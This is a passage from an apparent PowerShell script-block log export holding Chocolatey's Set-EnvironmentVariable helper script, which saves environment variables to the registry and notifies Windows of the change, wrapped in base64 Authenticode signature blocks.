c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Set-EnvironmentVariable.ps1 ¦ ScriptBlockId: 7904229b-0650-4136-8922-88e2d70ceba3 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq [System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, $Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # 